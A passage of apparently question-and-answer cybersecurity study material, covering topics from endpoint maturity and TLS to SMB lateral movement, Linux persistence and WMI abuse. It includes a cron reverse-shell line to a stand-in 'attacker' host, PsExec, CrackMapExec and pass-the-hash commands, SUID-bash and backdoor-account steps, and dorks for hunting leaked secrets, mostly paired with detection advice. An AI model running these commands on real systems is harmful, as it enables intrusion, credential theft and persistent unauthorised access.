Modern mitigations: ASLR: heap address randomised; heap metadata corruption harder (need to leak heap address first); canaries in metadata (glibc 2.17+): detect heap corruption; tcache counts: prevent tcache dup by checking count; safe-linking; research: heap exploitation increasingly requires chaining with info leak to get heap/libc base address before exploitation; CTF categories: pwn (binary exploitation including heap).
What is endpoint security maturity and how do you measure it?

Endpoint security maturity: how well endpoints are protected against threats; measured along multiple dimensions. Maturity dimensions: (1) Visibility and inventory: do you know all endpoints? Asset management database; automated discovery; CMDB accuracy; missing unmanaged endpoints = blind spots for attackers. (2) Patch management: what % of endpoints patched within SLA? SLA: critical: 7 days; high: 30 days; medium: 90 days; low: 180 days; metrics: % compliant per severity tier; time to patch; patch failure rate; exceptions management. (3) Endpoint protection: AV/EPP coverage: what % have active, updated AV? EDR coverage: what % have EDR deployed and connected? EDR sensor health: are all sensors reporting? Any gaps? (4) Configuration hardening: CIS benchmark compliance %: what % of endpoints pass CIS Level 1 checks? Key settings: encryption, screen lock, firewall, auto-update, password policy. (5) Vulnerability management: what % of critical CVEs remediated within SLA? Mean time to remediate critical vulnerabilities; vulnerability debt trend. (6) Detection capability: are you detecting threats on endpoints? Time from compromise to detection (MTTD per endpoint); % threats detected by EDR vs other sources; alert triage efficiency. (7) Response capability: how quickly do you respond and contain? Automation: can you isolate an endpoint in seconds (automated via SOAR + EDR API) or hours (manual ticket)?; remote investigation capability without physical access. Metrics framework: build dashboard: total managed endpoints; % with EDR (target: 100%); % with current patches (target: >95% critical, >90% high); % compliant with baseline (target: >85%); MTTD for endpoint threats; MTTR for endpoint compromises; track monthly and trend. Gaps commonly found: unmanaged devices (IoT, BYOD, legacy systems exempt from MDM); inconsistent EDR deployment (network segments without EDR coverage); high exception rate for patches (exceptions become permanent); EDR alerts not reviewed (alert fatigue or understaffed SOC); no automated isolation capability (slow containment).
What is a virtual private network (VPN) and how does it work?

VPN: creates encrypted tunnel between user and VPN server; hides traffic from ISP and network; appears to originate from VPN server IP. How it works: user establishes connection to VPN server; authentication (certificate, username/password, MFA); encryption negotiated (TLS or IPsec); all traffic routed through encrypted tunnel to VPN server; VPN server decrypts, forwards to destination; response returns via same tunnel. Types: Remote access VPN: individual user connects to organisation network; most common enterprise use case; protocols: SSL/TLS VPN (most common: OpenVPN, AnyConnect, GlobalProtect, Pulse Secure), IPsec VPN (IKEv2/IPsec common for mobile), WireGuard (modern, fast, simple). Site-to-site VPN: connect two office networks permanently; branch office to HQ; replaced by SD-WAN in many enterprises. Consumer VPN: privacy tool; hide browsing from ISP; appear in different geographic location; providers: NordVPN, ExpressVPN, Mullvad; not security tool for enterprises. Protocols comparison: OpenVPN: open-source; TLS-based; widely compatible; TCP or UDP; slower than WireGuard; IKEv2/IPsec: fast; mobile-friendly (reconnects quickly after network change); built into iOS, Android; enterprise-grade; WireGuard: modern; fast; simple codebase (4000 lines vs 600,000 for OpenSSL); UDP-based; increasingly popular; built into Linux kernel 5.6+; SSTP: Microsoft; HTTPS port 443; penetrates firewalls; Windows native; L2TP/IPsec: outdated; combination protocol; L2TP encapsulates, IPsec encrypts; not recommended (NSA allegedly cracked implementation). Security limitations: VPN protects network layer; does not protect against compromised endpoints, malware, phishing, or application vulnerabilities; split tunnelling: some VPNs allow non-corporate traffic to bypass VPN; risk if user accesses corporate resources after browsing malicious site (malware on endpoint uses corporate tunnel); full tunnel preferred for corporate; VPN server vulnerabilities: Pulse Secure (CVE-2019-11510 -- unauthenticated file read; actively exploited by nation-states), Citrix (CVE-2019-19781), Fortinet, GlobalProtect all had critical CVEs; patch VPN servers immediately; replace with ZTNA if possible.
What is the MITRE DEFEND framework?

MITRE D3FEND: knowledge graph of defensive cybersecurity techniques; complement to MITRE ATT&CK (offensive techniques); maps defensive countermeasures to specific ATT&CK techniques. Purpose: answer: what specific defences protect against specific ATT&CK techniques? Security teams use to: identify defensive gaps against specific threat actor TTPs; justify security investments (purchase of specific tool addresses specific ATT&CK technique); assess completeness of defensive posture; communicate with executives (what defence addresses what threat). Structure: Digital Artefacts: software, hardware, data objects that defenders can observe or protect; Defensive Techniques: specific defensive capabilities that protect, detect, or respond to offensive techniques; for each defensive technique: what artefacts it manipulates; what ATT&CK techniques it counters; technique categories: Harden (reduce attack surface): application hardening, credential hardening, message hardening, network hardening, platform hardening; Detect (identify threats): file analysis, identifier analysis, message analysis, network traffic analysis, platform monitoring, process analysis, user behaviour analysis; Isolate (restrict access): execution isolation, network isolation; Deceive (mislead attacker): decoy environment, decoy file, decoy network resource, decoy user credential; Evict (remove attacker): credential eviction, process eviction, execution eviction. Example mapping: Spearphishing Link (T1566.002): D3FEND countermeasures: Homoglyph Detection (detect look-alike domains), DNS Denylisting (block known phishing domains), URL Analysis (scan links), Sender Policy Framework (SPF validation), Email User Training, Inbound Traffic Filtering. Using D3FEND: ATT&CK Navigator: show attack techniques threat actor uses; D3FEND: for each technique, identify applicable defences; gap analysis: which required defences are not implemented?; present to management: here are specific ATT&CK techniques threat actor uses; here are specific defences we lack. Integration with tools: Wiz, Prisma Cloud mapping security controls to ATT&CK/D3FEND; security architecture reviews use D3FEND to verify controls address expected threats.
How do you perform a red team operation planning?

Red team operation planning: structured planning for realistic adversary simulation engagement. Objectives: define what intelligence-driven scenario to simulate (emulate specific threat actor targeting your industry; test detection of specific TTPs; test response to ransomware or data exfiltration scenario); measurable goals (reach domain admin without detection; exfiltrate 100MB of data without SIEM alert; maintain persistence for 30 days undetected). Rules of Engagement: out-of-scope systems (production databases with real PII -- read-only test data only; systems supporting life safety); prohibited techniques (DoS, destructive actions, social engineering of specific employees if HR has not approved); notification restrictions (who knows red team is active; purple team knows, blue team does not -- stealth test); abort conditions (if attacker path leads to real critical system; if unintended outage); data handling (discovered credentials must not be used beyond proof; found PII must be reported immediately). Threat intelligence research: identify most likely threat actors for organisation (based on industry, geography, size, public announcements); research threat actor TTPs (MITRE ATT&CK group profile, public reports from Mandiant, CrowdStrike, Recorded Future, CISA advisories); build threat actor playbook (initial access methods they use, C2 infrastructure characteristics, lateral movement tools, data staging methods). Infrastructure setup: build realistic C2 infrastructure (aged domains, categorised, CDN-fronted if appropriate; operator security -- no attribution to red team firm); prepare tooling (custom implants if required; CS malleable profiles to mimic threat actor); OPSEC for team (separate identities from pentesting; segregated infrastructure). Execution phases: pre-engagement (scope, contracts, emergency contacts); initial access (phishing campaign, vulnerability exploitation, physical access per scope); establish foothold (deploy C2, gain persistence); internal reconnaissance (AD enumeration, network mapping, identify targets); privilege escalation (to admin); lateral movement (reach target systems); objective completion (data exfiltration, detection simulation, persistence persistence); reporting. Metrics: detection rate (what % of techniques triggered SIEM alert); response time (from detection to response action); dwell time (time before detection); technique coverage (% of used techniques detected).
What is a cybersecurity risk assessment?

Cybersecurity risk assessment: systematic process to identify, analyse, and evaluate security risks to organisation; foundation for risk-informed security decisions. Standards: NIST SP 800-30 (Guide for Conducting Risk Assessments): framework; NIST RMF (Risk Management Framework); ISO 27005 (information security risk management); FAIR (Factor Analysis of Information Risk): quantitative framework. Types: asset-based: start with assets; identify threats and vulnerabilities for each; calculate risk; threat-based: start with threat actors and scenarios; identify which assets at risk; vulnerability-based: start with vulnerability scan; identify affected assets; calculate exposure. Process steps: (1) Prepare: define scope and objectives; identify stakeholders; select risk methodology. (2) Identify assets: information assets (data), systems (servers, endpoints, cloud), processes (business processes), people (employees, contractors); assign asset value (confidentiality, integrity, availability impact if compromised). (3) Identify threats: threat catalogue (STRIDE, MITRE ATT&CK, NIST SP 800-30 threat source tables); relevant threat actors for organisation (APT groups, cybercriminals, insiders, natural disasters); for each asset: what threats apply? (4) Identify vulnerabilities: vulnerability scans; security assessment findings; audit results; known CVEs in used software; process and policy gaps. (5) Determine likelihood: based on: threat actor capability and motivation, vulnerability exploitability, existing controls; qualitative (High/Medium/Low) or quantitative (probability estimate). (6) Determine impact: based on: asset value, consequences (financial, regulatory, reputational, operational); qualitative or quantitative (financial impact in dollars). (7) Calculate risk: risk matrix: likelihood x impact = risk level; FAIR: risk = loss event frequency x probable loss magnitude. (8) Risk treatment options: avoid, transfer (insurance), mitigate, accept; prioritise by risk level; cost-benefit analysis for mitigations. (9) Document and communicate: risk register; executive risk report; board communication. Risk appetite: maximum risk organisation willing to accept; risks above appetite require treatment; risks below appetite may be accepted; set by board and executive leadership.
What is a cloud security architecture review?

Cloud security architecture review: assess security design of cloud infrastructure; identify gaps before deployment or as part of ongoing governance. Scope: all cloud resources and services used (compute, storage, network, identity, database, serverless, containers); multi-cloud if applicable; IaC (Terraform, CloudFormation, Pulumi) reviewed alongside deployed state. Identity and access: is IAM least-privilege enforced? service accounts, workload identities, human users, cross-account access; are there AWS root account restrictions? (no access keys, MFA required, no regular use); is there federation to corporate IdP (SAML/OIDC) or are local cloud IAM users used?; are privilege escalation paths identified (CIEM analysis)?; is MFA enforced for all human access? Network architecture: is network segmentation implemented (VPCs, subnets, NSGs, security groups)?; are private subnets used for databases and backend services?; is there network flow logging (VPC Flow Logs)?; are internet-facing services minimal (only load balancers/CDN exposed)?; is there WAF on internet-facing applications?; are VPN or private connectivity (Direct Connect, ExpressRoute, Cloud Interconnect) used instead of internet for corporate access? Data security: is data classified? Are sensitive data stores identified?; is encryption at rest enabled for all storage (EBS, S3, RDS, DynamoDB)?; are customer-managed encryption keys (CMEK) used for sensitive data?; is data exfiltration prevention in place (VPC Service Controls, S3 bucket policies, DLP)?; are backup and recovery tested? Logging and monitoring: is cloud audit logging comprehensive (CloudTrail, Activity Log, Cloud Audit Logs)?; is threat detection enabled (GuardDuty, Defender for Cloud, Security Command Center)?; are logs forwarded to SIEM?; is there alerting on critical events (root login, IAM changes, public bucket creation, privilege escalation)?; is retention adequate (1 year minimum)? Compliance and posture: is CSPM tool deployed and configured with compliance frameworks?; are CI/CD pipelines scanning IaC before deployment (Checkov, tfsec)?; are regular access reviews conducted?; is the incident response plan updated for cloud scenarios?; are cloud-specific OPSEC considerations addressed (no shared credentials, separate prod and dev accounts with SCP guardrails)?
What is lateral movement via SMB?

SMB (Server Message Block) lateral movement: exploit Windows file sharing protocol for lateral movement; most common lateral movement technique. Prerequisites: valid credentials (plaintext, NTLM hash, or Kerberos ticket) for target system local admin or domain admin. Techniques: PsExec (Sysinternals): copies service binary to ADMIN$ share; installs service remotely; executes; most detected by EDR; leaves significant forensic artefacts; network: port 445 plus IPC$; command: psexec \\TARGET -u domain\admin -p password cmd.exe; SMBExec (Impacket): similar to PsExec but creates service remotely using SVCCTL RPC calls; more covert than PsExec; Impacket smbexec.py domain/admin:pass@TARGET. CrackMapExec (CME): network-wide SMB attack tool; test credentials across all hosts: cme smb 192.168.1.0/24 -u admin -p password (test credentials on all hosts); execute commands: cme smb TARGET -u admin -p pass -x whoami; modules: mimikatz, lsassy (remote credential dump), spider_plus (file enumeration). Pass-the-Hash via SMB: Impacket smbclient.py: smbclient.py domain/admin@TARGET -hashes LM:NTLM; access SMB shares with hash without cracking; psexec.py -hashes LM:NTLM domain/admin@TARGET (remote shell via hash). SMB relay attack: capture NTLM authentication challenge-response from victim (Responder: poison LLMNR/NBT-NS to intercept authentication); relay captured credentials to target system in real-time; no need to crack hash; target authenticates relay as victim; ntlmrelayx.py (Impacket): capture and relay NTLM auth to SMB or LDAP; Defence: SMB signing: all SMB connections require cryptographic signature; relay attacks fail (cannot create valid signature without knowing password). Detection: Event 4648 (login with explicit credentials) on target; Event 4624 logon type 3 (network) from unusual source; ADMIN$ or IPC$ share connection from workstation to workstation; Service installation events (7045) from lateral movement; Sysmon network connection to port 445 from unusual source. Prevention: host-based firewall block SMB between workstations (workstation-to-workstation port 445 generally not needed); block SMB to servers except from admin subnets; LAPS (unique local admin passwords); SMB signing enforcement; disable SMBv1 (EternalBlue vector); Kerberos armoring (FAST) for additional auth protection.
What is exploit development and buffer overflow exploitation?

Buffer overflow: write data beyond allocated buffer boundary; overwrite adjacent memory; control program execution. Stack-based overflow: function allocates local buffer on stack; vulnerable: char buf[64]; gets(buf) (no length check); strcpy(dst, src) (no length check); strncpy with wrong length; attacker provides more than 64 bytes; overflow overwrites: saved return address (EIP/RIP on x86/x64); saved frame pointer (EBP/RBP); other local variables; control EIP: point to attacker shellcode or ROP gadgets. Classic exploitation (32-bit Linux, no mitigations): find vulnerability (fuzzing, code review, crash); determine buffer size (cyclic pattern: AAAABBBBCCCCDDDD; note which bytes in EIP at crash; offset = position in pattern); control EIP: send offset bytes + shellcode address; place shellcode in buffer or environment; execute. Mitigations and bypasses: ASLR (Address Space Layout Randomisation): randomises stack, heap, library addresses; bypass: info leak vulnerability reveals libc base address; calculate gadget addresses relative to leak; ret2libc without shellcode (ASLR does not protect code segments with non-PIE binaries). NX/DEP (Non-Executable stack/Data Execution Prevention): marks stack as non-executable; shellcode cannot execute on stack; bypass: ROP (Return-Oriented Programming): chain existing code gadgets (ret-ending instruction sequences) to build arbitrary computation without injecting new code; ropgadget, ROPgadget, pwntools ROP tools find gadgets; typical ROP chain: call system(/bin/sh) using gadgets. PIE (Position Independent Executable): code segment also randomised; bypass: info leak of code address + calculate gadgets relative to it. Stack canary: random value between locals and return address; checked before function return; bypass: info leak canary value (format string vulnerability reveals stack contents); brute force (fork server -- canary same across forks); overwrite without touching canary (heap overflow). Tools: pwntools (Python): de facto CTF and exploit development library; gdb + peda/pwndbg/gef: enhanced GDB for debugging exploits; checksec: check binary mitigations; ROPgadget, ropper: find ROP gadgets; angr: binary analysis and automatic exploit generation. Binary patching: patchelf (change library paths); hex editor for small patches.
How do you reverse engineer malware?

Malware reverse engineering: analyse malicious software to understand behaviour, capabilities, and indicators of compromise. Safety: always in isolated environment; VM with no shared clipboard, no network (or controlled fake network); snapshot before analysis; never run on production or connected machine. Static analysis (no execution): file identification: file command, ExifTool, TrID (identify file type from magic bytes); strings: extract human-readable strings (strings malware.exe; look for URLs, domains, IPs, file paths, registry keys, error messages); hashing: SHA256 hash (search VirusTotal); packing detection: PEiD, Detect-It-Easy (DIE); many malware packed with UPX, MPRESS, custom packer to evade AV; packing indicated by: high entropy sections, few imports, UPX section headers; disassembly: IDA Pro (commercial, gold standard); Ghidra (NSA, free, excellent); Binary Ninja; Cutter (Radare2 GUI); Hopper (macOS); disassemble to assembly; identify key functions (main function, string operations, network code, crypto code); decompilation: IDA Hex-Rays decompiler; Ghidra decompiler; retdec; convert assembly to pseudo-C; much easier to read than assembly. Dynamic analysis (execution in sandbox): automated sandbox: ANY.RUN (interactive), Hybrid Analysis, Cuckoo Sandbox, JoeSandbox, VirusTotal sandbox; run sample; observe: network connections (domain, IP, port, protocol), file system changes (created, modified, deleted files), registry changes, process creation and injection, API calls. Manual dynamic analysis: Process Monitor (ProcMon): all file, registry, network, process events; Process Hacker / Process Explorer: view all processes, loaded DLLs, network connections; Wireshark: network traffic; API Monitor: hook Windows API calls; show parameters; x64dbg, OllyDbg (32-bit): interactive debugger; set breakpoints; step through execution; dump unpacked code. Indicators of compromise: C2 domains and IPs (extracted from strings or observed in traffic); mutexes (malware creates mutex to avoid double infection; identify mutex from dynamic analysis); registry persistence keys; file paths; hashes of dropped files; network signatures (YARA, Snort, Sigma rules). YARA: pattern matching language; write rules matching malware characteristics; scan files or memory.
What is certificate transparency and how does it improve security?

Certificate Transparency (CT): public log of all TLS certificates issued; enables detection of misissued or fraudulent certificates. Problem it solves: before CT: Certificate Authorities could issue certificates without public record; malicious or compromised CA could issue fraudulent cert for google.com; attackers use fraudulent cert for MITM; no way to detect unless observed in traffic. DigiNotar incident (2011): DigiNotar CA compromised; fraudulent certs issued for google.com, *.google.com, other domains; used in Iran to intercept Iranian users; only discovered when user reported cert warning; CT designed to prevent such incidents. How CT works: when CA issues certificate: submits to CT log server (public, append-only, Merkle tree-based); CT log issues signed certificate timestamp (SCT); SCT embedded in certificate, OCSP stapling, or TLS extension; browsers (Chrome, Safari) require SCT for trust; certificate without SCT from recognised log: untrusted. CT logs: Google Argon, Google Xenon, Cloudflare Nimbus, DigiCert Log Server, others; publicly queryable; all certificates publicly visible; Merkle tree structure: tamper-evident (cannot remove or modify logged cert without detection). Certificate monitoring: organisations monitor CT logs for their domains; alert when new cert issued: could indicate: legitimate (known cert issuance), phishing (attacker obtained cert for phishing site using your domain); subdomain tracking (see all subdomains with certs -- useful for attack surface management); crt.sh: public CT log search; certstream: real-time stream of newly issued certificates from CT logs; monitoring tools: Cert Spotter (SSLMate), FB CT monitoring, ProjectDiscovery's Notify. Attack surface discovery: pentesters use CT logs to discover all subdomains of target: crt.sh searches all certificates for domain; find subdomains not discoverable via DNS brute force; older certificates reveal historical subdomains; amass, subfinder use CT log API for subdomain enumeration. Limitations: CT logs contain all certificates including phishing sites; phishing site operators also benefit from seeing defenders issue certificates; organisational certificates (client certificates for internal PKI) should not be submitted to public CT logs (reveals internal structure).
What is post-exploitation persistence on Linux?

Linux persistence: mechanisms to maintain access after initial foothold; survive reboot, logout, credential change. Cron jobs: crontab -e (user crontab); /etc/crontab (system crontab, requires root); /etc/cron.d/ (system cron drop-in directory); cron.daily/weekly/monthly (run scripts in these directories); example: add reverse shell: * * * * * root /bin/bash -c /bin/bash -i >& /dev/tcp/attacker/4444 0>&1 2>&1; detection: audit crontabs (crontab -l; cat /etc/crontab; ls /etc/cron.*); monitor /var/spool/cron/. Systemd services: create service file: /etc/systemd/system/malicious.service; [Service] ExecStart=/usr/local/bin/backdoor; systemctl enable malicious.service; runs on boot with configured privileges; detection: systemctl list-units --all; audit /etc/systemd/system/; modified existing services (rc.local, network services). SSH authorised keys: add attacker public key to ~/.ssh/authorized_keys or /root/.ssh/authorized_keys; provides permanent SSH access even after password change; detection: audit authorised_keys files; monitor changes. User accounts and sudo: create new user: useradd -m -s /bin/bash backdoor; set password; add to sudo group; also: modify existing user (hidden account); detection: review /etc/passwd for new accounts; review sudoers. SUID/SGID binaries: set SUID bit on binary: chmod u+s /bin/bash (bash -p for root shell); or copy bash/cp/find to /tmp and set SUID; detection: find / -perm -4000 -type f 2>/dev/null (list SUID binaries; compare to baseline). Shared library hijacking: LD_PRELOAD environment variable; /etc/ld.so.preload (root required): specify library loaded before all others; override functions (libc functions like execve, read); detection: inspect /etc/ld.so.preload; LD_PRELOAD in environment. PAM (Pluggable Authentication Modules): modified PAM module accepts master password regardless of actual password; extremely stealthy; detection: compare PAM module hashes to known-good. Kernel module (rootkit): load malicious kernel module (insmod); hooks system calls; hides processes, files, connections; DKMS persistence; detection: compare lsmod to baseline; kernel integrity checking (IMA); memory forensics. Web shell: upload PHP/JSP/ASP web shell to web server directory; survives unless files cleaned; detection: file integrity monitoring (AIDE, Tripwire) on web root.
What is security testing in CI/CD pipelines?

DevSecOps security testing in CI/CD: integrate security testing into software development lifecycle; shift left. Pipeline stages and security tests: commit stage (IDE/commit): SAST (Semgrep, CodeQL, SonarQube): static code analysis; runs in seconds to minutes; developer sees results immediately; secret scanning (GitGuardian, TruffleHog, GitHub Secret Scanning): detect credentials committed to code; dependency check (Dependabot, Renovate, Snyk): flag new dependencies with known CVEs; IaC scanning (Checkov, tfsec, KICS): scan Terraform/CloudFormation for misconfigurations. Build stage: SCA (Software Composition Analysis): Snyk, WhiteSource, Black Duck; analyse all dependencies and transitive dependencies; generate SBOM (Software Bill of Materials); vulnerability and licence compliance check; container image scanning: Trivy, Grype, Snyk Container: scan Docker image for OS and library CVEs; block build if critical unfixed vulnerabilities. Deploy stage (pre-production): DAST (Dynamic Application Security Testing): OWASP ZAP, Burp Suite Enterprise, Rapid7 InsightAppSec; run against deployed application in staging; test running application for OWASP Top 10; baseline scan (automated, passive) fast; full scan slower (can run on schedule); API security testing: 42Crunch, Noname Security: validate API against OpenAPI spec; test for broken auth, injection, mass assignment. Post-deploy monitoring: CSPM/CWPP: cloud security posture and workload protection; Runtime application self-protection (RASP): instrument application to detect attacks in runtime; Intrusion detection at WAF (Cloudflare, AWS WAF, Akamai). Pipeline gating: break build or fail deployment on: new critical/high SAST findings (in-scope files); critical CVE in container image with fix available; new secrets detected in commit; IaC misconfiguration blocking deployment; do not gate on: existing vulnerabilities (technical debt queue separately); informational findings (alert but do not block); tuning: false positives undermine adoption; tune rules; create exceptions with justification and expiry; measure: MTTR (mean time to remediate) for security findings; vulnerability introduction rate per sprint; open vulnerability count trend.
What is a web application firewall (WAF) and how does it work?

WAF (Web Application Firewall): filters, monitors, and blocks HTTP/HTTPS traffic to and from web applications; protects against application layer attacks. How it works: sits in front of web application (inline or out of band); inspects HTTP requests and responses; compares against ruleset; blocks or allows traffic; deployment modes: reverse proxy (most common -- all traffic through WAF); transparent bridge; agent on web server (ModSecurity). Rulesets: signature-based: match known attack patterns (SQL injection strings, XSS payloads, path traversal sequences, scanner signatures); OWASP ModSecurity Core Rule Set (CRS): open-source; 200+ rules; industry standard for ModSecurity, Nginx WAF; commercial rulesets (Imperva, Cloudflare managed rules); anomaly detection: statistical analysis; score suspicious request elements; cumulative score above threshold = block; whitelisting: allow known-good requests; stricter than blacklisting; rate limiting: block IPs making too many requests; positive security model: learn normal traffic; block deviations; machine learning WAF: Cloudflare ML WAF; learn traffic patterns; detect novel attacks. Deployment options: Cloud WAF (CDN-based): Cloudflare, Akamai Kona, AWS WAF, Azure Front Door WAF, Fastly; simplest deployment; traffic routed through cloud provider; Appliance: Imperva, F5 BIG-IP ASM, Fortinet FortiWeb; hardware or virtual; on-premises; Open source software: ModSecurity (Apache/Nginx/IIS module); Coraza (Go); Libinjection. False positive management: WAF false positives block legitimate traffic; most critical operational challenge; start with detection mode (log only); tune rules; gradually move to blocking; whitelist legitimate patterns; monitor application error rates during WAF rollout. Limitations: WAF is defence in depth, not substitute for secure coding; bypassable (encoding, protocol manipulation); application-level logic issues (IDOR, auth bypass) not detected by WAF; encrypted payloads within HTTPS decryptable by WAF only if SSL offloaded at WAF (most cloud WAF do terminate SSL). Metrics: blocked requests per day; false positive rate; latency added by WAF; rule match distribution (which rules trigger most).
What is fuzzing in vulnerability research?

Fuzzing (fuzz testing): automated testing technique generating unexpected inputs; discovering crashes, hangs, memory corruption, logic errors. Types: Dumb fuzzing: random mutation; no knowledge of input format; fast but low depth; mutation-based: start from valid inputs; apply mutations (bit flip, byte swap, insert/delete bytes, known interesting values: 0, -1, 255, MAX_INT); generation-based: generate inputs from specification (protocol RFC, file format spec, grammar); smart: combines mutation with coverage guidance. Coverage-guided fuzzing: instrument target to track code coverage; feedback loop: inputs increasing coverage are retained (corpus); discard inputs not adding coverage; efficiently explores code; AFL++ (American Fuzzy Lop): most widely used binary fuzzer; instruments target with coverage counters; manages corpus; applies mutation strategies; generates test cases increasing code paths; LibFuzzer: in-process fuzzer; linked into target library; LLVM instrumentation; very fast (no process startup overhead per test); Honggfuzz: coverage-guided, hardware-accelerated with Intel BTS/IPT. Targets: file format parsers: images (libpng, libjpeg, ImageMagick), documents (PDF, docx, HTML), media (ffmpeg, libav); network protocol parsers: TLS, HTTP, SSH, DNS; browsers: most security-critical targets; Chrome has 100+ fuzzers running continuously in OSS-Fuzz; OS kernel: syzkaller (Google, kernel fuzzer): coverage-guided syscall fuzzing; discovered hundreds of kernel CVEs; code interpreter: language parsers (PHP, Python, JavaScript engines). Sanitisers: compile with sanitisers to detect memory errors at runtime: ASan (AddressSanitizer): detect buffer overflows, use-after-free, double-free; UBSan (Undefined Behaviour Sanitizer): detect integer overflow, null pointer dereference; MSan (MemorySanitizer): detect use of uninitialised memory; tsan (ThreadSanitizer): detect data races; without sanitisers: memory corruption may cause silent incorrect results or delayed crash. OSS-Fuzz: Google continuous fuzzing service for critical open source; 1000+ open source projects; runs billions of tests per day; reported 10,000+ bugs since launch 2016. Crash triage: minimise crash input (creduce, python-creduce); reproduce consistently; determine exploitability (is it write to controlled address? Is arbitrary code possible?; exploit development if warranted).
What is the role of cryptography in TLS?

TLS (Transport Layer Security) cryptography: how cryptographic operations protect web and network communications. TLS handshake cryptography overview: client sends ClientHello: supported cipher suites, TLS version, client random; server responds ServerHello: chosen cipher suite, TLS version, server random, server certificate; certificate verification: client validates server certificate chain; checks CA signature, expiry, domain name, revocation status (OCSP/CRL); key exchange: establish shared session keys without transmitting them; symmetric encryption phase: data encrypted with negotiated cipher using derived session keys. Key exchange mechanisms: RSA key exchange (deprecated in TLS 1.3): client generates pre-master secret; encrypts with server public key; server decrypts with private key; derives session keys; problem: no forward secrecy (record TLS traffic; later steal private key; decrypt all past sessions); ECDHE (Elliptic Curve Diffie-Hellman Ephemeral): both parties generate ephemeral key pair; exchange public keys; compute shared secret independently (DH math); shared secret used to derive session keys; ephemeral: new key pair per session; forward secrecy: even if server private key stolen; cannot decrypt past sessions (ephemeral keys not stored); standard in TLS 1.3. Cipher suites: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384: ECDHE = key exchange; RSA = certificate signature algorithm; AES_256_GCM = symmetric cipher (AES-256 in GCM mode); SHA384 = MAC/PRF; TLS 1.3 simplified: TLS_AES_256_GCM_SHA384 (key exchange always ECDHE or X25519); Certificate signatures: RSA or ECDSA; server proves control of private key corresponding to certificate public key; in TLS 1.3: server signs handshake transcript with private key; client verifies with certificate public key. Record protocol: authenticated encryption: AES-GCM or ChaCha20-Poly1305; AEAD (Authenticated Encryption with Associated Data): provides both confidentiality (encryption) and integrity (authentication tag); prevents both eavesdropping and tampering; separate keys for client->server and server->client; sequence numbers prevent replay. Perfect Forward Secrecy (PFS): ECDHE provides PFS; NSA cannot bulk collect TLS traffic and decrypt later using stolen certificate private key; enables security even against passive recording of traffic by powerful adversaries.
What is OSINT in cybersecurity?

OSINT (Open Source Intelligence): gathering information from publicly available sources; used in security for reconnaissance, threat intelligence, vulnerability research, and investigations. Sources: search engines: Google, Bing, DuckDuckGo; Google dorking (Google hacking): use advanced search operators to find sensitive information: site:target.com filetype:pdf (find PDFs on domain); inurl:admin (find admin pages); intitle:index of (find directory listings); site:github.com target company (find code repos mentioning company); site:pastebin.com target (find leaked data); WHOIS: domain registration information (registrant name, email, organisation, addresses, phone -- often privacy-protected now); historical WHOIS reveals past owners, contacts; DNS records: A, MX, CNAME, TXT, NS records; subdomains; zone transfer attempts; Shodan: search engine for internet-connected devices; query: org:Target Company; find servers, cameras, industrial systems, exposed services; discover internet-exposed infrastructure; Censys: similar to Shodan; certificate-based discovery; find all IPs with TLS certificates for target domain. Social media and people: LinkedIn: employee names, roles, technologies used (job postings reveal tech stack), org chart structure; Twitter/X: employee mentions of company projects; GitHub: employee repos; code commits revealing internal information; Hunter.io, RocketReach: find email addresses; format discovery (firstname.lastname@company.com); Maltego: graphical link analysis tool; OSINT data aggregation; visualise relationships. Certificate Transparency: crt.sh reveals all subdomains with issued certificates; historical certs show decommissioned subdomains. Data breach databases: Have I Been Pwned: check if email in known breach; Dehashed, IntelligenceX: full breach data search; find credentials for target domain (credential stuffing preparation). Code repositories: GitHub, GitLab, Bitbucket: search for company name, domain, API keys; GitHub dorks: filename:.env target, filename:config.json password; Truffles: TruffleHog (automated secret scanning). Tools framework: Maltego, Recon-ng, theHarvester, SpiderFoot, OSINT Framework (website with categorised tools). Legal and ethical: OSINT uses only publicly available information (no hacking required); legal in most jurisdictions; ethical: respect privacy; do not use for stalking, harassment; for security research: always stay within scope of engagement.
What are common Windows attack techniques using WMI?

WMI (Windows Management Instrumentation) abuse: legitimate Windows administration framework; extensively abused for lateral movement, persistence, reconnaissance, and execution. WMI overview: COM-based infrastructure; managed via WMI providers; accessible locally or remotely; uses DCOM (port 135 + dynamic ephemeral ports); requires admin credentials for remote access; part of every Windows installation; often not monitored. Reconnaissance: query system information: Get-WmiObject Win32_ComputerSystem (system info); Get-WmiObject Win32_Process (running processes); Get-WmiObject Win32_Service (services); Get-WmiObject Win32_UserAccount (local users); Get-WmiObject Win32_NetworkAdapterConfiguration (network config); remote: Get-WmiObject Win32_Process -ComputerName TARGET -Credential cred; or wmic /node:TARGET process list. Remote execution: Invoke-WmiMethod Win32_Process -Name Create -ArgumentList cmd.exe /c whoami > C:\result.txt (execute command; no interactive output -- write to file); Impacket wmiexec.py: domain/admin:pass@TARGET whoami (uses WMI Create method; provides semi-interactive shell); CrackMapExec: cme smb TARGET -u admin -p pass -x command (uses WMI or SMBExec). WMI event subscriptions (persistence): powerful persistence mechanism; executes command when WMI event occurs (logon, elapsed time, file creation); three parts: Event Filter (what event to watch), Event Consumer (what to do when event fires), FilterToConsumerBinding (links filter and consumer); persistence without files dropped (stored in WMI repository: OBJECTS.DATA); ActiveScriptEventConsumer (execute VBScript/JScript) or CommandLineEventConsumer (execute command); example: CommandLineEventConsumer runs backdoor.exe every 5 minutes using __IntervalTimerInstruction event filter; tools: PowerSploit: Install-WMIPersistence; Impacket: wmipersist.py. Detection: WMI activity logs (Microsoft-Windows-WMI-Activity/Operational): Event 5858 (query errors), 5860 (registration of temporary subscriptions), 5861 (registration of permanent subscriptions -- CRITICAL ALERT); Sysmon: Event 19 (WmiEventFilter), Event 20 (WmiEventConsumer), Event 21 (WmiEventConsumerToFilter binding); Autoruns: shows WMI subscriptions; WMI repository forensics: python-cim (parse WMI repository offline). Prevention: Application whitelisting prevents WMI consumer execution; SIEM alert on Event 5861 (WMI permanent subscription = persistence); network: restrict DCOM port 135 between workstations; audit WMI subscriptions regularly.
What is cloud workload protection (CWPP)?

